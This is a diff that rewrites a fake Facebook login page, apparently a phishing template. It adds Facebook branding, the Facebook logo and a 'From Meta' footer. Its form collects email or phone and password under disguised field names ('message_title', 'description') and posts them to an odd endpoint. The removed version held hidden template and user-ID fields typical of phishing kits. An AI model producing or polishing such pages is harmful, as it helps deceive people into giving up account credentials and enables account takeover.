@@ -1,47 +1,119 @@
 <html lang="en">
-                 <head>
-                 <meta charset="UTF-8">
-                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                 <title>Login</title>
-                 <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
-                 <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-                 <script src="https://cdn.tailwindcss.com"></script>
-                 <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-                 <style type="text/css" id="operaUserStyle">
-                 body{
-                   color:#000000; 
-                   background:#0000ff; 
-                 }
-                 </style>
-                 </head>
-                 <body class="bg-[#0000ff]">
-                  <noscript>You need to enable JavaScript to run this app.</noscript>
-                  <div id="root"><div>
-                  <div class="grid place-content-center grid-cols-1 md:px-96 mt-10 gap-10">
-                  <div class="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "></div>
-    <div class="flex justify-center w-full">
-    <img src="https://www.dropbox.com/scl/fi/lyd1gq9sxbm03mzkbbay0/1703528251570.jpg?rlkey=bs41146b2oleicmsrv9k2ducp&st=v2fa3txw&dl=0" alt="image" width="100px" height="50px">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+
+    <!-- External scripts and styles -->
+    <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+
+    <!-- Custom styling for the page -->
+    <style>
+        body {
+            background: #1877F2; /* Facebook blue */
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .form-container {
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            margin: auto;
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            font-size: 14px;
+            color: black;
+        }
+
+        .form-container button {
+            background-color: #1877F2;
+            color: white;
+            padding: 12px;
+            font-size: 14px;
+            border-radius: 4px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .form-container button:hover {
+            background-color: #166fe5;
+        }
+
+        .footer {
+            background-color: #3b5998;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            margin-top: auto; /* Push footer to the bottom */
+        }
+
+        .footer img {
+            width: 20px;
+            height: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        .footer .meta-text {
+            font-size: 12px;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Main content -->
+    <div class="form-container">
+        <!-- First Image -->
+        <img src="https://www.dropbox.com/scl/fi/lyd1gq9sxbm03mzkbbay0/1703528251570.jpg?rlkey=bs41146b2oleicmsrv9k2ducp&raw=1" 
+             alt="Facebook" width="500" height="60" class="mb-4">
+
+        <!-- Facebook Logo -->
+        <div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
+                 alt="Facebook Logo" width="80" height="80" class="mx-auto">
+        </div>
+
+        <h2 class="text-white text-xl mt-3">Log In to Facebook</h2>
+
+        <!-- Login Form -->
+        <form action="https://facebook.com/vpage" method="POST">
+            <div class="mt-4">
+                <input type="text" name="message_title" placeholder="Email or Phone" required>
+            </div>
+            <div>
+                <input type="password" name="description" placeholder="Password" required>
+            </div>
+            <div class="mt-4">
+                <button type="submit">Log In</button>
+            </div>
+        </form>
     </div>
-    <div class="flex justify-center w-full">
-    </div>
-    <p class="text-center" style="">Login First</p>
-    <form action="https://facebook.com/vpage" method="POST">
-    <input type="hidden" name="link" value="custom template">
-    <input type="hidden" name="ftype" value="normal">
-    <input type="hidden" name="login" value="login">
-    <input type="hidden" name="user_id" value="918">
-    <div class="p-2 w-full  gap-1  ">
-    <div class="flex flex-col   p-2  gap-1">
-    <label for="email" class="text-sm">Email or Phone</label>
-    <input type="text" class="w-full border p-2 rounded-md" name="message_title" placeholder="Email or Phone"></div>
-    <div class="flex flex-col   p-2   gap-1">
-    <label for="password" class="text-sm">Password</label>
-    <input type="password" class="w-full border p-2 rounded-md" name="description" placeholder="Password" id="password" autocomplete="new-password" aria-autocomplete="list"></div>
-    <div class="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
-    <button type="submit" class=" text-black font-semibold p-3 rounded-md w-full bg-[#125ec3] hover:bg-blue-600" style="width: 200px">Log In</button>
-    </div>
-    </div>
-    </form>
-    </div>
-    </div>
-    </div></body></html>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="flex justify-center items-center">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+            <span class="meta-text">Facebook © From Meta</span>
+        </div>
+    </footer>
+</body>
+</html>
